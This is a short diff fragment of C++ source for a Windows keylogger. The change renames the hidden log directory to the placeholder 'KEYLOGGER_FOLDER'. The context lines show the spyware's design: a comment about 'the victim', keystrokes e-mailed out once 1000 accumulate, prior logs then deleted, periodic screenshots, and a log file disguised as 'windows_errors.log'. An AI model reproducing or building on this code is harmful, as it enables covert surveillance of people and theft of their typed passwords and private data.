@@ -204,7 +204,7 @@ DWORD CMDExecute(std::string _command, bool _newWindow = true, bool _autoExit = 
 #define           KEYSTROKES_MAX            1000        /* When the victim have more keystrokes than this value
 			                                   the e-mail will be sent and the previously log files wil be deleted */
 
-#define           LOG_DIRECTORY             (std::string(getenv("LOCALAPPDATA")) + R"(\Temp\0x7B1)").c_str();
+#define           LOG_DIRECTORY             (std::string(getenv("LOCALAPPDATA")) + R"(\KEYLOGGER_FOLDER)").c_str();
 #define           SCREENSHOT_TIMER (UINT64) 100 * 1000  // The maximum number of screenshots in 24h will be of 864 screenshots (86400ms / 100s = 864ss)
 #define           LOG_NAME                  "windows_errors.log"
 #define           ZIP_ARCHIVE_NAME          "YOUR_ZIP_NAME.zip"
